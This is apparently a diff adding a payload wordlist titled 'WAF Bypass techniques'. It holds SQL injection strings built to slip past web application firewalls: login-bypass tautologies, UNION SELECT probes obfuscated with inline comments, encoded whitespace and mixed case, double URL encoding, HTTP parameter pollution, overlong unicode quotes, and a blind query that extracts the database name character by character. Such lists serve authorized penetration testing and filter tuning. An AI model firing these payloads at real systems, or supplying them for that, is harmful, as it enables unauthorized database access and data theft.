@@ -1,0 +1,34 @@
+# WAF Bypass techniques
+' OR 1=1--
+' OR '1'='1'--
+' OR 'a'='a'/*
+' OR 1=1;#
+' OR '1'='1' AND '1'='1'--
+' OR username LIKE 'admin%'--
+' UNION SELECT null,null--
+' UNION/**/SELECT/**/null,null--
+' UNION%0aSELECT%0anull,null--
+' UNION%09SELECT%09null,null--
+' UNION%0d%0aSELECT%0d%0anull,null--
+' UNION/*foo*/SELECT/*bar*/null,null--
+' OR 1=CONVERT(int, '1')--
+' OR '1' LIKE '1'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--
+
+# Case manipulation
+' uNiOn SeLeCt null,null--
+' UnIoN/**/sElEcT/**/null,null--
+' /*!UNION*/ /*!SELECT*/ null,null--
+' /*!50000UNION*/ /*!50000SELECT*/ null,null--
+
+# Double encoding
+%2527%2520OR%25201=1--
+%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/null,null--
+
+# HPP (HTTP Parameter Pollution)
+id=1&id=' OR '1'='1
+id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/null,null
+
+# Unicode bypass
+' OR 1=1--%ef%bc%8d%ef%bc%8d
+%c0%27 OR 1=1--
